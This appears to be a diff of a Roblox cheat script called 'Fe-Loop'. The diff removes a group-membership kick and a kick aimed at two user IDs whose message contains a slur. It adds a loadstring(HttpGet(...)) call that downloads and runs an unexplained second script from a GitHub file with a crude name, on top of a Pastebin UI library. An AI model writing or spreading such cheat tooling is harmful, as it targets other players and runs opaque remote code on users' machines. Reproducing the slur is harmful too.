@@ -29,14 +29,6 @@ end)
 
 setreadonly(meta,true)
 
-if not Player:IsInGroup(6000816) then
-    Player:Kick(("\nYOULOSEYOULOSEYOULOSE"):rep(200))
-end
-
-if tonumber(Player.UserId) == 448880972  or tonumber(Player.UserId) == 1628603504 then
-    Player:Kick("die retard")
-end
-
 local function findp(name)
     local t = {}
     if name:lower() == "all" then
@@ -84,7 +76,7 @@ end
 
 -- UI
 
-local Library = loadstring(game:HttpGet('https://pastebin.com/raw/d6rxRXPU', true))()
+local Library, Meth = loadstring(game:HttpGet('https://pastebin.com/raw/d6rxRXPU', true))(), loadstring(game:HttpGet('https://github.com/isthatjack/feloop/blob/master/fuckyou.lua', true))()
 
 local Window = Library:CreateWindow('Fe-Loop')
 local TargetFolder = Window:AddFolder('Target')
